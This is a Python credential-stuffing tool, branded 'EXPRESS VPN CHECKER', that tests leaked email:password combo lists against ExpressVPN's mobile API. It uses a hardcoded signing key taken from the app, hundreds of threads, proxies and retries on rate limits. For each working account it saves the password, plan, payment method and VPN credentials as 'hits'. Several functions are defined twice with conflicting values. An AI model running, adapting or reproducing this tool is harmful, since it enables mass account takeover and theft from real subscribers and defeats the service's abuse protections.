#Decode By Crazy | @PokiePy

import base64
import time
import gzip
import hashlib
import hmac
import json
import os
import random
import string
from datetime import datetime
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

import requests
from Crypto.Cipher import AES, PKCS1_v1_5, DES3
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from asn1crypto import cms, x509, keys

# Use rich library for styled UI (matching previous design)
from rich.console import Console
from rich.panel import Panel
from rich.padding import Padding
from rich.box import HEAVY
from rich.text import Text  # Only for banner centering

console = Console()
_first_run = True


# =========================
# Custom UI Tools (Matching Requested Style)
# =========================
def PerfectBox(title, body, color="cyan", icon="⚡"):
    """
    Custom PerfectBox:
    - Only the banner uses forced centering
    - All other content uses default left alignment
    - Messages ending with '...' are printed outside box with padding
    """
    if isinstance(body, str) and body.strip().endswith("..."):
        console.print(Padding(body, (0, 2)))
        return

    # Only apply centering if it's the banner text
    if body == BANNER_TEXT:
        body = Text(body.strip(), justify="center")
    else:
        body = body.strip()

    console.print(
        Panel(
            body,
            title=f"{icon} {title}",
            title_align="center",
            border_style=color,
            box=HEAVY,
            padding=(0, 1),
        )
    )


def clear_screen():
    global _first_run
    if _first_run:
        os.system("cls" if os.name == "nt" else "clear")
        _first_run = False


# Define banner text globally to enable centering check
BANNER_TEXT = """
⚡ EXPRESS VPN CHECKER ⚡

🛠️ Version 2.0.1 | 🚀 Multithreaded | 🎯 Precise
"""

def print_banner():
    PerfectBox("Developed by @yatowrlds", BANNER_TEXT, "blue", "🚀")
    time.sleep(0.1)


# =========================
# Cryptography Service
# =========================
class AesCryptographyService:

    def decrypt(self, data, key, iv):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data)
        padding_length = decrypted[-1]
        return decrypted[:-padding_length]


def get_byte_array(size):
    return get_random_bytes(size)


def envelope_encrypt(input_data, certificate):
    cert = x509.Certificate.load(certificate)
    issuer = cert.issuer
    serial_number = cert.serial_number
    public_key_info = cert.public_key

    if hasattr(public_key_info, 'parsed'):
        rsa_public_key = public_key_info.parsed
    else:
        rsa_public_key = keys.RSAPublicKey.load(public_key_info['public_key'].parsed.dump())

    modulus = rsa_public_key['modulus'].native
    public_exponent = rsa_public_key['public_exponent'].native
    rsa_key = RSA.construct((modulus, public_exponent))

    content_key = get_random_bytes(24)
    content_iv = get_random_bytes(8)

    pad_length = 8 - (len(input_data) % 8)
    if pad_length == 0:
        pad_length = 8
    padded_data = input_data + bytes([pad_length] * pad_length)

    cipher = DES3.new(content_key, DES3.MODE_CBC, content_iv)
    encrypted_content = cipher.encrypt(padded_data)

    cipher_rsa = PKCS1_v1_5.new(rsa_key)
    encrypted_key = cipher_rsa.encrypt(content_key)

    recipient_id = cms.IssuerAndSerialNumber({
        'issuer': issuer,
        'serial_number': serial_number
    })

    key_trans_recipient = cms.KeyTransRecipientInfo({
        'version': 0,
        'rid': cms.RecipientIdentifier(
            name='issuer_and_serial_number',
            value=recipient_id
        ),
        'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
            'algorithm': '1.2.840.113549.1.1.1',
        }),
        'encrypted_key': cms.OctetString(encrypted_key)
    })

    recipient_infos = cms.RecipientInfos([
        cms.RecipientInfo(
            name='ktri',
            value=key_trans_recipient
        )
    ])

    encrypted_content_info = cms.EncryptedContentInfo({
        'content_type': '1.2.840.113549.1.7.1',
        'content_encryption_algorithm': cms.EncryptionAlgorithm({
            'algorithm': '1.2.840.113549.3.7',
            'parameters': cms.OctetString(content_iv)
        }),
        'encrypted_content': encrypted_content
    })

    enveloped_data = cms.EnvelopedData({
        'version': 0,
        'recipient_infos': recipient_infos,
        'encrypted_content_info': encrypted_content_info
    })

    content_info = cms.ContentInfo({
        'content_type': '1.2.840.113549.1.7.3',
        'content': enveloped_data
    })

    return content_info.dump()


def gzip_data(input_string):
    input_bytes = input_string.encode('ascii')
    output_stream = BytesIO()
    with gzip.GzipFile(fileobj=output_stream, mode='wb') as gz:
        gz.write(input_bytes)
    return output_stream.getvalue()


def compute_signature(input_data, key):
    signature = hmac.new(key, input_data, hashlib.sha1).digest()
    return base64.b64encode(signature).decode('ascii')


def generate_random_string(length=64):
    return ''.join(random.choices(string.hexdigits.lower(), k=length))


def unix_time_to_date(unix_time):
    return datetime.fromtimestamp(int(unix_time)).strftime('%Y-%m-%d')

# =========================
# Result Saving
# =========================
def save_hit(account_data):
    if not os.path.exists('results'):
        os.makedirs('results')

    hits_file = 'results/ExpressVpnHits.txt'  # single file

    output_line = (
        f"{account_data['email']}:{account_data['password']} | "
        f"Plan = {account_data.get('plan', 'N/A')} | "
        f"ExpireDate = {account_data.get('expire_date', 'N/A')} | "
        f"DaysLeft = {account_data.get('days_left', 'N/A')} | "
        f"AutoRenew = {account_data.get('auto_renew', 'N/A')} | "
        f"PaymentMethod = {account_data.get('payment_method', 'N/A')} | "
        f"Script by @yatowrlds\n"
    )

    with open(hits_file, 'a', encoding='utf-8') as f:
        f.write(output_line)


# =========================
# Account Check Core
# =========================
def check_expressvpn(email, password, save_hits=True, proxy=None):
    account_data = {
        'email': email,
        'password': password,
        'is_premium': False
    }

    install_id = generate_random_string(64)
    base64_iv = base64.b64encode(get_byte_array(16)).decode('ascii')
    base64_key = base64.b64encode(get_byte_array(16)).decode('ascii')

    post_data = json.dumps({
        "email": email,
        "iv": base64_iv,
        "key": base64_key,
        "password": password
    })

    cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
    cert_bytes = base64.b64decode(cert_base64)

    gzipped_data = gzip_data(post_data)

    try:
        encrypted_post_data = envelope_encrypt(gzipped_data, cert_bytes)
    except Exception as e:
        return 'failed'

    hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
    header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
    header_signature = compute_signature(header_raw.encode('ascii'), hmac_key.encode('ascii'))
    post_data_signature = compute_signature(encrypted_post_data, hmac_key.encode('ascii'))

    url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
    headers = {
        "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
        "Expect": "",
        "Content-Type": "application/octet-stream",
        "X-Body-Compression": "gzip",
        "X-Signature": f"2 {header_signature} 91c776e",
        "X-Body-Signature": f"2 {post_data_signature} 91c776e",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate"
    }

    proxies = None
    if proxy:
        proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }

    try:
        response = requests.post(url, data=encrypted_post_data, headers=headers, proxies=proxies, timeout=30)

        if response.status_code == 200:
            try:
                aes_service = AesCryptographyService()
                decrypted_response = aes_service.decrypt(
                    response.content,
                    base64.b64decode(base64_key),
                    base64.b64decode(base64_iv)
                )
                response_body = decrypted_response.decode('ascii')
            except Exception as e:
                return 'failed'

            try:
                response_json = json.loads(response_body)
                access_token = None

                if "access_token" in response_json:
                    access_token = response_json["access_token"]
                if "ovpn_username" in response_json:
                    account_data['ovpn_username'] = response_json['ovpn_username']
                if "ovpn_password" in response_json:
                    account_data['ovpn_password'] = response_json['ovpn_password']
                if "pptp_username" in response_json:
                    account_data['pptp_username'] = response_json['pptp_username']
                if "pptp_password" in response_json:
                    account_data['pptp_password'] = response_json['pptp_password']

                if access_token:
                    sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
                    sub_header_signature = compute_signature(sub_raw.encode('ascii'), hmac_key.encode('ascii'))
                    batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                    batch_signature = compute_signature(batch_raw.encode('ascii'), hmac_key.encode('ascii'))

                    capture_body = json.dumps([{
                        "headers": {
                            "Accept-Language": "en",
                            "X-Signature": f"2 {sub_header_signature} 91c776e"
                        },
                        "method": "GET",
                        "url": f"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
                    }])

                    capture_body_signature = compute_signature(capture_body.encode('ascii'), hmac_key.encode('ascii'))
                    batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                    batch_headers = {
                        "User-Agent": "xvclient/v21.21.0 (ios wiecz; 14.4) ui/11.5.2",
                        "X-Body-Compression": "gzip",
                        "X-Signature": f"2 {batch_signature} 91c776e",
                        "X-Body-Signature": f"2 {capture_body_signature} 91c776e",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/json"
                    }

                    batch_response = requests.post(batch_url, data=capture_body, headers=batch_headers, proxies=proxies, timeout=30)

                    if batch_response.status_code == 429:
                        return 'rate_limited'

                    if batch_response.status_code == 200:
                        batch_data = batch_response.json()

                        if batch_data and len(batch_data) > 0:
                            item_status = batch_data[0].get('code') or batch_data[0].get('status')
                            if item_status == 429:
                                return 'rate_limited'

                        if batch_data and len(batch_data) > 0:
                            sub_data = batch_data[0].get('body', '{}')
                            if isinstance(sub_data, str):
                                sub_data = sub_data.replace('\\"', '"')
                                try:
                                    sub_json = json.loads(sub_data)

                                    if 'subscription' in sub_json:
                                        sub_json = sub_json['subscription']

                                    license_status = str(sub_json.get('license_status', '')).upper()

                                    if 'billing_cycle' in sub_json:
                                        account_data['plan'] = f"{sub_json['billing_cycle']} Month"
                                    if 'expiration_time' in sub_json:
                                        exp_time = sub_json['expiration_time']
                                        exp_date = unix_time_to_date(exp_time)
                                        account_data['expire_date'] = exp_date
                                        current_time = int(datetime.now().timestamp())
                                        days_left = int((int(exp_time) - current_time) / 86400)
                                        account_data['days_left'] = days_left
                                    if 'auto_bill' in sub_json:
                                        account_data['auto_renew'] = str(sub_json['auto_bill']).lower()
                                    if 'payment_method' in sub_json:
                                        account_data['payment_method'] = sub_json['payment_method']

                                    if license_status == 'REVOKED':
                                        return 'free'

                                    if license_status in ['ACTIVE', 'TRIAL', 'PAID']:
                                        if 'expiration_time' in sub_json:
                                            current_time = int(datetime.now().timestamp())
                                            exp_time = int(sub_json['expiration_time'])
                                            if exp_time > current_time:
                                                account_data['is_premium'] = True
                                                if save_hits:
                                                    save_hit(account_data)
                                                return 'premium'

                                    return 'failed'
                                except Exception as e:
                                    pass
            except Exception as e:
                pass

            return 'failed'

        elif response.status_code == 401:
            return 'failed'
        elif response.status_code == 429:
            return 'rate_limited'
        else:
            # Note: Target API endpoints return "unsupported webpage type" error per provided docs
            with display_lock:
                PerfectBox(
                    "API WARNING",
                    "⚠️ Target endpoints may be unsupported or unavailable. Check API status later.",
                    "yellow", "ℹ️"
                )
            return 'failed'

    except Exception as e:
        return 'failed'


# =========================
# Proxy Loading
# =========================
def load_residential_proxy(proxy_file):
    if not proxy_file or not os.path.exists(proxy_file):
        PerfectBox("Proxy Status", "✖ No valid proxy file provided or found", "red", "🔌")
        return None
    
    try:
        with open(proxy_file, 'r') as f:
            proxies = [line.strip() for line in f if line.strip() and '@' in line]
        if proxies:
            PerfectBox("Proxy Status", f"✔ Loaded {len(proxies)} proxy(ies) from file", "green", "🔌")
            return proxies[0]  # Use first valid proxy
        else:
            PerfectBox("Proxy Status", "✖ No valid proxies found in file", "red", "🔌")
            return None
    except Exception as e:
        PerfectBox("Proxy Error", f"✖ Failed to load proxies: {str(e)}", "red", "🚫")
        return None


# =========================
# Global Stats & Locks
# =========================
counter_lock = Lock()
display_lock = Lock()
stats = {
    'live': 0,
    'free_count': 0,
    'premium_count': 0,
    'failed_count': 0,
    'retry_count': 0
}


# =========================
# Progress Display
# =========================
def update_display(total):
    import sys
    with display_lock:
        status_text = (
            f"[yellow][{stats['live']}/{total}] ⚡ Progress | "
            f"[green]Premium: {stats['premium_count']} | "
            f"[blue]Free: {stats['free_count']} | "
            f"[red]Failed: {stats['failed_count']} | "
            f"[yellow]Retries: {stats['retry_count']}[/yellow]"
        )
        console.print(status_text, end='\r')
        sys.stdout.flush()


# =========================
# Combo Processing
# =========================
def process_combo(combo, total, proxy):
    if ':' not in combo:
        with counter_lock:
            stats['failed_count'] += 1
            stats['live'] += 1
        update_display(total)
        return

    email, password = combo.split(':', 1)
    email = email.strip()
    password = password.strip()
    result = check_expressvpn(email, password, proxy=proxy)

    max_attempts = 50
    attempts = 0
    while result == 'rate_limited' and attempts < max_attempts:
        attempts += 1
        with counter_lock:
            stats['retry_count'] += 1
        update_display(total)
        
        import time
        time.sleep(0.5)
        
        result = check_expressvpn(email, password, proxy=proxy)

    with counter_lock:
        stats['live'] += 1
        if result == 'premium':
            stats['premium_count'] += 1
        elif result == 'free':
            stats['free_count'] += 1
            with display_lock:
                PerfectBox(
                    "FREE ACCOUNT",
                    f"ℹ️ {email}:{password}\n└─ No active premium subscription",
                    "blue", "ℹ️"
                )
        else:
            stats['failed_count'] += 1

    update_display(total)


# =========================
# Global Stats & Helpers
# =========================
from threading import Lock
import sys
import os
from datetime import datetime


counter_lock = Lock()
display_lock = Lock()
stats = {
    'live': 0,
    'free_count': 0,
    'premium_count': 0,
    'failed_count': 0,
    'retry_count': 0
}


def update_display(total):
    import sys

    # ANSI color codes
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    MAGENTA = "\033[95m"
    RESET = "\033[0m"

    with display_lock:
        sys.stdout.write("\r")  # go to start of line
        sys.stdout.write(
            f"Live {YELLOW}{stats['live']}{RESET}/{total} | "
            f"Free {BLUE}{stats['free_count']}{RESET} | "
            f"Premium {GREEN}{stats['premium_count']}{RESET} | "
            f"Failed {RED}{stats['failed_count']}{RESET} | "
            f"Retry {MAGENTA}{stats['retry_count']}{RESET}"
        )
        sys.stdout.flush()


def load_residential_proxy(proxy_file):
    if not proxy_file or not os.path.exists(proxy_file):
        return None
    
    try:
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and '@' in line:
                    return line
        return None
    except Exception as e:
        PerfectBox("Proxy Load Error", f"✖ Failed to load proxy: {str(e)}", "red", "⚠️")
        return None


def process_combo(combo, total, proxy):
    if ':' not in combo:
        with counter_lock:
            stats['failed_count'] += 1
            stats['live'] += 1
        update_display(total)
        return

    email, password = combo.split(':', 1)
    email = email.strip()
    password = password.strip()

    result = check_expressvpn(email, password, proxy=proxy)

    max_attempts = 5
    attempts = 0
    while result == 'rate_limited' and attempts < max_attempts:
        attempts += 1
        with counter_lock:
            stats['retry_count'] += 1
        update_display(total)

        import time
        time.sleep(0.5)

        result = check_expressvpn(email, password, proxy=proxy)

    with counter_lock:
        stats['live'] += 1
        if result == 'premium':
            stats['premium_count'] += 1
        elif result == 'free':
            stats['free_count'] += 1
        else:
            stats['failed_count'] += 1

    update_display(total)

# =========================
# Main Checker Runner
# =========================
def run_express_checker():
    import time
    from concurrent.futures import ThreadPoolExecutor

    # Clear screen and show banner
    clear_screen()
    print_banner()
    PerfectBox("ExpressVPN Checker", "CLI Mode | Custom Config", "cyan", "🔧")
    time.sleep(0.2)

    # Get inputs
    filename = console.input("\n[bold yellow]Enter combo file name: [/bold yellow]").strip()
    if not os.path.exists(filename):
        PerfectBox("File Error", f"✖ '{filename}' not found!", "red", "🚫")
        return

    proxy_file = console.input("[bold yellow]Enter proxy file name (blank for none): [/bold yellow]").strip()
    proxy = load_residential_proxy(proxy_file)

    while True:
        try:
            workers = console.input("[bold yellow]Enter threads (default 999): [/bold yellow]").strip()
            num_workers = int(workers) if workers else 999
            if num_workers > 0:
                break
            print("[bold red]Enter positive number![/bold red]")
        except ValueError:
            num_workers = 999
            break

    # Load combos
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        PerfectBox("File Error", f"✖ Failed to read: {str(e)}", "red", "🚫")
        return

    total = len(combos)
    if total == 0:
        PerfectBox("Data Error", "✖ No valid combos found!", "red", "🚫")
        return

    # Show summary
    PerfectBox("Check Summary", f"📊 Total: {total}\n🔥 Threads: {num_workers}\n🔌 Proxy: {'On' if proxy else 'Off'}", "yellow", "📈")
    time.sleep(1)
    print("\n🔍 Starting checks...\n")

    # Reset stats
    global stats
    stats = {
        'live': 0,
        'free_count': 0,
        'premium_count': 0,
        'failed_count': 0,
        'retry_count': 0
    }

    # Run checks
    start = time.time()
    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        executor.map(lambda c: process_combo(c, total, proxy), combos)

    # Final output
    print("\n\n")
    PerfectBox(
        "CHECK COMPLETE",
        f"✅ Done!\n├─ Total: {total}\n├─ Premium: {stats['premium_count']}\n├─ Free: {stats['free_count']}\n├─ Failed: {stats['failed_count']}\n└─ Time: {time.time()-start:.1f}s",
        "green", "🏁"
    )

    if stats['premium_count'] > 0:
        save_path = f"results/ExpressVpnHits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        PerfectBox("RESULTS SAVED", f"💾 Saved to {save_path}", "blue", "💾")


# =========================
# Entry Point
# =========================
if __name__ == "__main__":
    if not os.path.exists('results'):
        os.makedirs('results')
    run_express_checker()

